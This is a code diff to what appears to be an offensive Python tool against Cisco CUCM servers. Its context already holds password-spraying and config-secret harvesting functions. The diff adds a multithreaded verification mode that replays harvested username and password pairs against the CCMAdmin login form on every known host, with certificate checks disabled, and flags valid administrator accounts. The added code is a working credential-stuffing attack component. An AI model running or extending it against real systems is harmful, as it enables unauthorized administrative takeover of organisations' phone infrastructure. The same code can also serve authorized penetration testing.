@@ -1119,6 +1119,130 @@ def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_f
             time.sleep(sleep_secs)
 
 
+def verify_ccmadmin_login(session, cucm_host, port, username, password, timeout=10):
+    """
+    Attempt a CCMAdmin (Tomcat j_security_check) form login on `session`.
+
+    1. GET /ccmadmin/showHome.do to seed the JSESSIONID cookie.
+    2. POST j_username/j_password to /ccmadmin/j_security_check with
+       allow_redirects=False.
+
+    Returns (result, status_code):
+      'valid'   — 302/303 whose Location is NOT a login/error page.
+      'invalid' — 302/303 to a login/error page, or a 200 (logon form re-shown).
+      'error'   — network failure, or any other status (403/404/5xx).
+    """
+    base = f'https://{cucm_host}:{port}/ccmadmin'
+    try:
+        session.get(f'{base}/showHome.do', verify=False, timeout=timeout)
+        resp = session.post(
+            f'{base}/j_security_check',
+            data={'j_username': username, 'j_password': password},
+            verify=False,
+            timeout=timeout,
+            allow_redirects=False,
+        )
+    except Exception as e:
+        dbg(f'verify_ccmadmin_login {username}@{cucm_host} raised {type(e).__name__}: {e}')
+        return ('error', None)
+
+    code = resp.status_code
+    if code in (302, 303):
+        location = (resp.headers.get('Location') or '').lower()
+        if 'login' in location or 'error' in location:
+            return ('invalid', code)
+        return ('valid', code)
+    if code == 200:
+        return ('invalid', code)
+    return ('error', code)
+
+
+def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=None):
+    """
+    Thread target. Pops (cucm_host, username, password) tuples off work_queue,
+    attempts a CCMAdmin login, logs every attempt to verification_attempts, and
+    tallies results['valid'|'invalid'|'error'] under results['lock'].
+
+    _login_fn is injectable for testing (default: verify_ccmadmin_login).
+    """
+    if _login_fn is None:
+        _login_fn = verify_ccmadmin_login
+
+    session = requests.Session()
+    while True:
+        try:
+            cucm_host, username, password = work_queue.get_nowait()
+        except queue.Empty:
+            return
+
+        result, status_code = _login_fn(session, cucm_host, port, username, password, timeout=timeout)
+        error = None if result != 'error' else 'login error'
+        log_verification_attempt(cucm_host, username, password, result, status_code, error, db_file)
+
+        if result == 'valid':
+            print(f'[+] VALID admin: {username}@{cucm_host}')
+
+        with results['lock']:
+            results[result] += 1
+
+
+def run_verify(hosts, pairs, port, threads, db_file):
+    """
+    Top-level orchestrator for --verify.
+
+    Builds the cross-product hosts × pairs into (cucm_host, username, password)
+    tuples, skips combinations already definitively verified, runs a worker pool
+    of CCMAdmin login attempts, and logs every attempt to verification_attempts.
+
+    Returns the results dict (valid/invalid/error/skipped counts) or None under
+    _TEST_MODE.
+    """
+    if _TEST_MODE:
+        return None
+
+    if not hosts:
+        print('[-] No known CUCM hosts in the database. Nothing to verify.')
+        return None
+    if not pairs:
+        print('[-] No credential pairs (username+password) in the database. Nothing to verify.')
+        return None
+
+    work = queue.Queue()
+    skipped = 0
+    queued = 0
+    for host in hosts:
+        for username, password in pairs:
+            if is_already_verified(host, username, password, db_file):
+                skipped += 1
+            else:
+                work.put((host, username, password))
+                queued += 1
+
+    print(f'[+] Verifying {len(pairs)} credential pair(s) against {len(hosts)} host(s): '
+          f'{queued} attempt(s) queued, {skipped} already verified (skipped).')
+
+    results = {'valid': 0, 'invalid': 0, 'error': 0, 'skipped': skipped, 'lock': threading.Lock()}
+    if queued == 0:
+        print('[+] Nothing to do; all combinations already verified.')
+        return results
+
+    worker_threads = []
+    for _ in range(max(1, min(threads, queued))):
+        t = threading.Thread(
+            target=_verify_worker,
+            args=(work, results, port, db_file),
+            daemon=True,
+        )
+        t.start()
+        worker_threads.append(t)
+    for t in worker_threads:
+        t.join()
+
+    print(f'[+] Verification complete: valid={results["valid"]} '
+          f'invalid={results["invalid"]} error={results["error"]} skipped={skipped}')
+    return results
+
+
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Processing config file: {filename}')
